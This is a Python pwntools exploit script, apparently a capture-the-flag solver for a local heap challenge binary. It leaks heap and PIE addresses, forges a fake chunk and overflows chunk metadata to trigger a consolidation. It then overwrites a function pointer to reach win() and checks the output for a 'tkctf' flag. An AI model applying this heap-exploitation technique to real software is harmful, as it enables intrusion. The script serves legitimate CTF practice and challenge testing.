#!/usr/bin/env python3

import os
import re
import sys
from pwn import *

context.arch = "x86_64"
context.log_level = 'info'

ROOT = os.path.abspath(os.path.dirname(__file__))
bin_path = os.path.join(ROOT, "../docker/target")

def manifest(p, zone):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'(0-9): ', str(zone).encode())

def inscribe(p, zone, data):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'(0-9): ', str(zone).encode())
    p.sendlineafter(b'max 128 bytes): ', data)

def view(p, zone):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'(0-9): ', str(zone).encode())
    return p.recvuntil(b'> ', drop=True)

def corrupt(p, zone):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'(0-9): ', str(zone).encode())

def liberate(p, zone):
    p.sendlineafter(b'> ', b'5')
    p.sendlineafter(b'(0-9): ', str(zone).encode())

def execute_timeline(p):
    p.sendlineafter(b'> ', b'6')

def exploit(p):
    elf = ELF(bin_path)
    win_addr = elf.symbols['win']

    log.info("Manifesting all zones")
    for i in range(10):
        manifest(p, i)

    log.info("Leaking heap address")
    output = view(p, 3)
    try:
        heap_leak = int(output.split(b'0x')[1].split(b']')[0], 16)
        log.success(f"Heap leak: {hex(heap_leak)}")
        zone_3_addr = heap_leak
    except:
        log.error("Failed to parse heap leak")
        log.info(output.decode('latin-1', errors='ignore'))
        return None

    log.info("Crafting fake chunk in Zone 3")

    zone_6_addr = zone_3_addr + 0x190 + 0x110 + 0x110
    log.info(f"Zone 6 estimated at: {hex(zone_6_addr)}")

    fake_chunk_offset = 0x80
    fake_chunk_addr = zone_3_addr + fake_chunk_offset
    prev_size_value = zone_6_addr - fake_chunk_addr

    log.info(f"Fake chunk at: {hex(fake_chunk_addr)}")
    log.info(f"Prev_size value: {hex(prev_size_value)}")

    fake_chunk = flat({
        0x00: p64(0),
        0x08: p64(0x111),
    }, length=0x80)

    inscribe(p, 3, fake_chunk)

    log.info("Enabling corruption on Zone 3")
    corrupt(p, 3)

    log.info("Overflowing into Zone 4 to corrupt metadata")

    overflow_payload = b'A' * 0x80 + p64(prev_size_value)[:7]
    inscribe(p, 3, overflow_payload)

    log.info("Liberating Zone 6")
    liberate(p, 6)

    log.info("Getting PIE base")
    output = view(p, 9)
    try:
        exec_ptr = int(output.split(b'Execute ptr: 0x')[1].split(b']')[0], 16)
        log.success(f"Execute ptr: {hex(exec_ptr)}")

        elf_base = exec_ptr - elf.symbols['safe_exit']
        win_addr_full = elf_base + win_addr
        log.success(f"PIE base: {hex(elf_base)}")
        log.success(f"win() at: {hex(win_addr_full)}")
    except:
        log.warning("Could not leak PIE base, using relative address")
        win_addr_full = win_addr

    log.info("Attempting to overwrite function pointer")

    payload = p64(win_addr_full)
    inscribe(p, 7, payload)

    log.info("Executing timeline")
    execute_timeline(p)

    return p.recvall(timeout=2)

def parse_flag(out):
    m = re.search(b"(tkctf{[^}]+})", out)
    if m is None:
        return None
    return m.group(0).decode()

if __name__ == '__main__':
    if "REMOTE" in os.environ:
        if not "PORT" in os.environ:
            print("[!] Please specify the port number")
            exit(1)
        p = remote("localhost", int(os.environ["PORT"]))
    else:
        p = process(bin_path)

    output = exploit(p)
    if output:
        flag = parse_flag(output)
        if flag:
            print(f"Found: {flag}")
            print("OK!")
            exit(0)

    print("FAILED!")
    exit(1)

